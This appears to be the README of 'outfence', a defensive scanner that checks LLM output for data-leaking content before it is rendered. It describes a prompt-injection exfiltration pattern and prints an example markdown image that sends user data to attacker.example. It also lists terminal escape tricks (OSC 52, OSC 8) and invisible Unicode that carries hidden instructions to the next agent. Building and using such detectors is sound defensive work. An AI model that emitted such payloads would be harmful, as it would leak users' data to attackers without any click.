outfence: detect dangerous LLM output before it is rendered in AI agents

Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.

What it detects

Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.

Most prompt-injection tooling looks at what goes *into* a model. outfence looks at what comes *out*. When an injected document convinces a model to emit a markdown image such as ![](https://attacker.example/p.png?d=<your data>), the renderer fetches that URL automatically and the data leaves with no click. The same idea applies to HTML <img>, CSS url(), terminal escape sequences that write to the clipboard (OSC 52) or hide a link target (OSC 8), and invisible Unicode that carries hidden instructions to the next agent.

Single Python file, standard library only, no network calls.

Usage

python3 outfence.py examples                      # scan a folder (text/md/html/json/jsonl)
python3 outfence.py response.md --json
llm "summarize" < page.html | python3 outfence.py -            # stdin
python3 outfence.py transcript.jsonl --allow-host '*.mycompany.com' --allow-host cdn.example.org
python3 outfence.py --sanitize response.md > safe.md           # neutralised copy
python3 outfence.py --list-rules

After pip install of the kit, the same options work as agentsec outfence …. Every tool also accepts --help and almost every tool accepts --json.

Example output

The examples folder has a poisoned markdown answer, a terminal answer with OSC 52/OSC 8/ conceal escapes, an OpenAI-style transcript, and a clean answer that produces no findings. All URLs use reserved .example domains or documentation IP ranges, and all secrets are fake.

Captured against the bundled fixtures (fake data only):

$ python3 outfence.py examples/transcript.json --fail-on none

SARIF and CI

agentsec outfence path/to/input --sarif > outfence.sarif

# GitHub Actions (composite action ships with the repo)
- uses: dunkleschitz/agentsec@v0
  with:
    tools: outfence
    paths: path/to/input
    fail-on: high

SARIF 2.1.0 can be uploaded to GitHub code scanning. The composite action writes per-tool reports under agentsec-sarif/ by default.

Known limits

Heuristic scanner, not a security boundary. A clean result does not mean something is safe. All example secrets in this repository are fake.

Full source, tests, and fixtures: tools/outfence/ in the repository. Install the kit with pip install git+https://github.com/dunkleschitz/agentsec.git.
